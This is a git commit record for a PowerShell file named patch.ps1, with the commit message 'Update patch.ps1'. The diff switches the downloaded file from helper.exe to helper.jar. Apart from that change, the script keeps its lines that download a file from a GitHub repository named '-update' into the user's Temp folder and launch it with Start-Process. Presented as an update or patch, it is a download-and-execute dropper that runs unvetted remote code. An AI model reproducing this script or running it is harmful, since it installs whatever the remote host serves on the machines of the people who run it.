50da55c32f7f1241c14a0850bec02a5ed504d643
Mark <harriettexkvblf107@gmail.com>
2026-05-25 20:55:09 +0300

    Update patch.ps1

--- patch.ps1
+++ patch.ps1
@@ -1,4 +1,4 @@
-$url = "https://github.com/FlatMelodyVise/-update/raw/refs/heads/main/helper.exe"
-$path = "$env:Temp\helper.exe"
+$url = "https://github.com/FlatMelodyVise/-update/raw/refs/heads/main/helper.jar"
+$path = "$env:Temp\helper.jar"
 (New-Object System.Net.WebClient).DownloadFile($url, $path)
 Start-Process -FilePath $path
